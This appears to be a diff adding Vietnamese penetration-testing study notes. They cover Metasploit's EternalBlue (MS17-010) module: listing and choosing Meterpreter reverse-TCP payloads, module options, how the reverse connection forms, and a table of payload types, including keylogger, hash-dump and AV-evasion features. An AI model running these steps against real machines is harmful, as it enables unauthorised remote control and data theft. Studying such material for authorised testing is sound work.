@@ -467,6 +467,106 @@ Chọn Payload trong Metasploit
   Từ đó ta chọn đúng payload phù hợp để dùng.
 👉 Ý chính: Thay vì dùng payload mặc định (reverse shell đơn giản), ta chọn Meterpreter x64 payload cho Windows 7 để có nhiều tính năng hơn.
 
+//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+MSF - Searching for Specific Payload
+
+  msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter show payloads
+     6   payload/windows/x64/meterpreter/bind_ipv6_tcp                        normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
+     7   payload/windows/x64/meterpreter/bind_ipv6_tcp_uuid                   normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support
+     8   payload/windows/x64/meterpreter/bind_named_pipe                      normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager
+     9   payload/windows/x64/meterpreter/bind_tcp                             normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager
+     10  payload/windows/x64/meterpreter/bind_tcp_rc4                         normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager (RC4 Stage Encryption, Metasm)
+     11  payload/windows/x64/meterpreter/bind_tcp_uuid                        normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64)
+     12  payload/windows/x64/meterpreter/reverse_http                         normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
+     13  payload/windows/x64/meterpreter/reverse_https                        normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
+     14  payload/windows/x64/meterpreter/reverse_named_pipe                   normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager
+     15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
+     16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
+     17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
+     18  payload/windows/x64/meterpreter/reverse_winhttp                      normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)
+     19  payload/windows/x64/meterpreter/reverse_winhttps                     normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)
+  msf6 exploit(windows/smb/ms17_010_eternalblue) > grep -c meterpreter show payloads
+  [*] 14
+
+  msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter grep reverse_tcp show payloads
+    => chỉ còn show ra 3 kết quả 
+
+//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+Selecting Payloads
+
+  msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
+  Module options (exploit/windows/smb/ms17_010_eternalblue):
+     Name           Current Setting  Required  Description
+     ----           ---------------  --------  -----------
+     RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+     RPORT          445              yes       The target port (TCP)
+     SMBDomain      .                no        (Optional) The Windows domain to use for authentication
+     SMBPass                         no        (Optional) The password for the specified username
+     SMBUser                         no        (Optional) The username to authenticate as
+     VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
+     VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.
+  Exploit target:
+     Id  Name
+     --  ----
+     0   Windows 7 and Server 2008 R2 (x64) All Service Packs
+  msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter grep reverse_tcp show payloads
+     15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
+     16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
+     17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
+  msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 15
+  payload => windows/x64/meterpreter/reverse_tcp
+
+//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+MSF - Meterpreter Commands
+
+  meterpreter > help
+
+Khi bạn exploit thành công bằng một payload kiểu Meterpreter reverse TCP, thì quy trình như sau:
+1. Stager trên máy nạn nhân chạy → nó tạo kết nối ngược (reverse connection) về máy attacker.
+2. Ngay khi kết nối thành công, framework (Metasploit) sẽ tự động mở một Channel để quản lý luồng dữ liệu qua lại.
+  Channel 1 thường là kết nối chính (reverse TCP session).
+  Nếu sau này bạn mở thêm shell, webcam, hay file transfer thì nó có thể tạo ra Channel 2, 3,… để phục vụ các chức năng riêng.
+Lúc này Metasploit báo "Meterpreter session x opened" → nghĩa là channel chính đã được tạo và bạn được đưa vào CLI của Meterpreter.
+👉 Vậy nên: không cần bạn tự tạo channel bằng tay, mà nó sẽ tự động sinh ra ngay khi payload kết nối về thành công.
+
+//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+Payload Types
+
+| **Payload**                           | **Mô tả**                                          | **Đặc điểm chính**                                                       |
+| ------------------------------------- | -------------------------------------------------- | ------------------------------------------------------------------------ |
+| **generic/custom**                    | Payload chung, do người dùng tự định nghĩa         | Linh hoạt, đa nền tảng                                                   |
+| **generic/shell\_bind\_tcp**          | Bind shell TCP cơ bản                              | Victim lắng nghe, attacker kết nối vào                                   |
+| **generic/shell\_reverse\_tcp**       | Reverse shell TCP cơ bản                           | Victim kết nối ngược về attacker                                         |
+| **windows/x64/exec**                  | Thực thi lệnh bất kỳ (VD: `calc.exe`)              | Chạy trực tiếp một process                                               |
+| **windows/x64/loadlibrary**           | Load một thư viện DLL x64                          | Dùng để nạp DLL tùy ý                                                    |
+| **windows/x64/messagebox**            | Hiện hộp thoại MessageBox                          | Chủ yếu để test, PoC                                                     |
+| **windows/x64/shell\_reverse\_tcp**   | Reverse shell, **single payload**                  | Toàn bộ shellcode nằm trong 1 payload                                    |
+| **windows/x64/shell/reverse\_tcp**    | Reverse shell, **staged payload** (stager + stage) | Nhẹ ban đầu, tải thêm sau                                                |
+| **windows/x64/shell/bind\_ipv6\_tcp** | Bind shell trên IPv6                               | Dùng trong mạng IPv6                                                     |
+| **windows/x64/meterpreter/**          | Meterpreter reverse/bind/...                       | Nhiều tính năng nâng cao (file, webcam, keylogger, pivot, dump hash,...) |
+| **windows/x64/powershell/**           | Payload PowerShell                                 | Cho session PowerShell, dễ bypass AV/EDR                                 |
+| **windows/x64/vncinject/**            | VNC server reflective injection                    | Cho attacker truy cập GUI desktop của victim                             |
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
